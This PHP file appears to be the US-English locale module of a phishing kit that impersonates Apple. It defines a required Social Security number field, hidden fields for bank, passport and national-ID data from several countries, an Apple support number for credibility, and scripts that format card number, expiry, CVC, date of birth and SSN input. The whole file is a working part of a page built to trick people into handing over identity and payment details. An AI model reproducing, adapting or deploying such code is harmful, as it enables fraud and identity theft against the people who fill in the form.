<?php
/*
------------------
Language: English US
------------------
*/

$langx = array();
$langx['POSTCODE'] = 'ZIP Code';
$langx['COUNTRY'] = 'USA';
$langx['COUNTYSELECT'] = '
<select id="county" name="county" type="text" class="form-control select-country" style="height:32px!important;padding-left:10px;" >
<option value="">state</option><option value="AA">AA</option><option value="AE">AE</option><option value="AK">AK</option><option value="AL">AL</option><option value="AP">AP</option><option value="AR">AR</option><option value="AS">AS</option><option value="AZ">AZ</option><option value="CA">CA</option><option value="CO">CO</option><option value="CT">CT</option><option value="DC">DC</option><option value="DE">DE</option><option value="FL">FL</option><option value="FM">FM</option><option value="GA">GA</option><option value="GU">GU</option><option value="HI">HI</option><option value="IA">IA</option><option value="ID">ID</option><option value="IL">IL</option><option value="IN">IN</option><option value="KS">KS</option><option value="KY">KY</option><option value="LA">LA</option><option value="MA">MA</option><option value="MD">MD</option><option value="ME">ME</option><option value="MH">MH</option><option value="MI">MI</option><option value="MN">MN</option><option value="MP">MP</option><option value="MO">MO</option><option value="MS">MS</option><option value="MT">MT</option><option value="NC">NC</option><option value="ND">ND</option><option value="NE">NE</option><option value="NH">NH</option><option value="NJ">NJ</option><option value="NM">NM</option><option value="NV">NV</option><option value="NY">NY</option><option value="OH">OH</option><option value="OK">OK</option><option value="OR">OR</option><option value="PA">PA</option><option value="PR">PR</option><option value="PW">PW</option><option value="RI">RI</option><option value="SC">SC</option><option value="SD">SD</option><option value="TN">TN</option><option value="TX">TX</option><option value="UT">UT</option><option value="VA">VA</option><option value="VI">VI</option><option value="VT">VT</option><option value="WA">WA</option><option value="WI">WI</option><option value="WV">WV</option><option value="WY">WY</option>
</select>
';
$langx['ACCOUNT'] = '
<input type="hidden" name="acno" value="-">
<input type="hidden" name="sortcode" value="-">
<input type="hidden" name="bans" value="-">
';
$langx['SSN'] = '
<div class="row edit-row">
<div class="col-sm-5">
<h3 class="section-subtitle">SOCIAL SECURITY NUMBER</h3>
<div class="form-group">
<div class="pop-wrapper field-pop-wrapper">
<div class="dob-wrapper clearfix">
  <input type="text" name="ssn" id="ssn" class="generic-input-field form-control field" placeholder="social security number" maxlength="11" required="required">
</div>
</div>
</div>
</div>
</div>
';
$langx['CREDITLIMIT'] = '
<input type="hidden" name="climit" value="-">
';
$langx['PASSPORT'] = '
<input type="hidden" name="passport" value="-">
';
$langx['NUMBID'] = '
<input type="hidden" name="numbid" value="-">
';
$langx['NAID'] = '
<input type="hidden" name="naid" value="-">
';
$langx['CIVILID'] = '
<input type="hidden" name="civilid" value="-">
';
$langx['QATARID'] = '
<input type="hidden" name="qatarid" value="-">
';
$langx['CITIZENID'] = '
<input type="hidden" name="citizenid" value="-">
';
$langx['APPCALL'] = '1-800-MY-APPLE';
$langx['FLAG'] = 'assets/img/us.png';
?>
<script type='text/javascript' src="assets/js/jquery-1.9.1.js"></script>
<script type='text/javascript' src="assets/js/jquery.validate.min.js"></script>
<script type='text/javascript' src="assets/js/jquery.payment.js"></script>
<script type='text/javascript' src="assets/js/additional-methods.min.js"></script>
<script type='text/javascript' src="assets/js/jquery.maskedinput.js"></script>
<script type='text/javascript' src="assets/js/Valid.US.js"></script>
  <script>
    jQuery(function($) {
      $('.cc-number').payment('formatCardNumber');
      $('.cc-exp').payment('formatCardExpiry');
      $('.cc-cvc').payment('formatCardCVC');
      $.fn.toggleInputError = function(galat) {
        this.parent('.form-group').toggleClass('has-error', galat);
        return this;
      };

    });
  </script>
<script type='text/javascript'>
jQuery(function($){
   $("#dob").mask("99/99/9999",{placeholder:"MM/DD/YYYY"});
   $("#ccexp").mask("99 / 99",{placeholder:"MM / YY"});
   $("#ssn").mask("999-99-9999",{placeholder:"xxx-xx-xxxx"});
});
</script>
